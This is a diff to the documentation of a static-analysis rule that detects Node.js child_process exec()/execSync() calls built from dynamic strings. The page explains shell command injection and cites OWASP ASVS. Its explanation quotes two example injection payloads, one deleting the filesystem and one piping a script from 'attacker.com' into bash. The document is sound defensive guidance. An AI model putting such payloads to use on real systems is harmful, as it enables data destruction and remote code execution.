@@ -29,7 +29,7 @@ This rule detects calls to `exec()` or `execSync()` from Node.js's `child_proces
 
 `exec()` spawns a shell (`/bin/sh -c` on Unix) and is **not disabled by default** in Node.js. The safer alternatives `execFile()` and `spawn()` are also built into `child_process` but require explicit adoption. Template literals make it syntactically convenient to embed variables into command strings, which is why this pattern is so common in codebases that never intended to be vulnerable.
 
-## Why This Matters
+## Why this matters
 
 `exec()` passes its first argument to the system shell (`/bin/sh -c` on Unix). The shell interprets metacharacters like `;`, `&&`, `||`, `|`, `$()`, and backticks as command separators or substitutions. An attacker who controls even a small portion of the command string, a filename, an ID, a format option, can append `;rm -rf /` or `; curl attacker.com/shell.sh | bash`. The resulting execution happens with the full privileges of the Node.js process, which in many deployments runs as root or a privileged service account.
 
@@ -37,7 +37,7 @@ A typical target is any endpoint that wraps a CLI tool: image conversion, PDF ge
 
 OWASP ASVS v4 requirement **V5.3.8** states: "Verify that the application does not pass user-supplied input to OS commands, or that the application uses safe command execution APIs that prevent command injection."
 
-## What Gets Flagged
+## What gets flagged
 
 A call that resolves to `child_process` `exec`/`execSync` (module binding, destructured or aliased import, `require('child_process').exec`, or a `promisify(exec)` wrapper) whose command is built at run time:
 
